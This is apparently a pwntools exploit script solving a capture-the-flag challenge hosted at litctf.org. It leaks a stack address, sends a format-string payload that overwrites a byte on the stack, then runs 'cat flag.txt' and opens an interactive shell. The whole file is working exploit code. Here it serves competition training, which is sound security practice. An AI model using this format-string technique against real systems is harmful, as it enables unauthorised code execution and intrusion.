from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./main"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("litctf.org", 31785)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

io.recvuntil("at: ", drop=True)
buf = int(io.recv(14), 16)
log.success("buf:-----> " + hex(buf))

payload = fmtstr_payload(8, {buf-0x8: 1}, write_size="byte")
ddebug("breakrva 0x001286\n continue")
io.sendline(payload)

io.sendline(b"cat flag.txt")
io.interactive()
